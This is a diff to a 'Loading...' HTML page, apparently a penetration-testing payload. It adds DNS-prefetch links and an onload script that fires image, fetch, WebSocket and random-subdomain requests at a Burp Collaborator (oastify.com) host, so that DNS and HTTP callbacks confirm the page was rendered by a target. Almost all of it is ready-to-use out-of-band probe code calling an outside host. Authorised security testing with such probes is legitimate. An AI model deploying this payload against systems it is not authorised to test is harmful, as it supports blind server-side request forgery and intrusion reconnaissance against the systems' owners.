@@ -2,15 +2,53 @@
 <html>
 <head>
     <title>Loading...</title>
+    
+    <!-- DNS Prefetch - triggers DNS lookup -->
+    <link rel="dns-prefetch" href="//dns.1bdsghjjw842yfegczeszkmxhonib9zy.oastify.com/">
+    <link rel="prefetch" href="http://prefetch.1bdsghjjw842yfegczeszkmxhonib9zy.oastify.com/">
+    
     <script>
         window.onload = function() {
-            const img = new Image();
-            img.src = 'http://1bdsghjjw842yfegczeszkmxhonib9zy.oastify.com/';
-            document.body.innerHTML = '<h2>Payload Triggered!</h2><p>Check Burp Collaborator!</p>';
+            var collaborator = '1bdsghjjw842yfegczeszkmxhonib9zy.oastify.com/';
+            
+            // Method 1: HTTP request (what you already have)
+            const img1 = new Image();
+            img1.src = 'http://' + collaborator;
+            
+            // Method 2: DNS via different subdomain HTTP requests
+            const img2 = new Image();
+            img2.src = 'http://dns1.' + collaborator;
+            
+            const img3 = new Image();
+            img3.src = 'http://dns2.' + collaborator;
+            
+            // Method 3: Fetch with different subdomains (triggers DNS)
+            fetch('http://fetch1.' + collaborator).catch(() => {});
+            fetch('http://fetch2.' + collaborator).catch(() => {});
+            
+            // Method 4: WebSocket attempt (triggers DNS)
+            try {
+                new WebSocket('ws://ws.' + collaborator);
+            } catch(e) {}
+            
+            // Method 5: Create multiple subdomains for DNS lookups
+            for(let i = 1; i <= 5; i++) {
+                const img = new Image();
+                img.src = 'http://sub' + i + '.' + collaborator;
+            }
+            
+            // Method 6: Dynamic DNS lookups with random subdomains
+            setTimeout(function() {
+                const randomSub = Math.random().toString(36).substring(7);
+                const img = new Image();
+                img.src = 'http://' + randomSub + '.' + collaborator;
+            }, 1000);
+            
+            document.body.innerHTML = '<h2>DNS + HTTP Payloads Triggered!</h2><p>Check Burp Collaborator for both DNS and HTTP requests!</p>';
         }
     </script>
 </head>
 <body>
-    <p>Loading payload...</p>
+    <p>Loading DNS + HTTP payloads...</p>
 </body>
 </html>
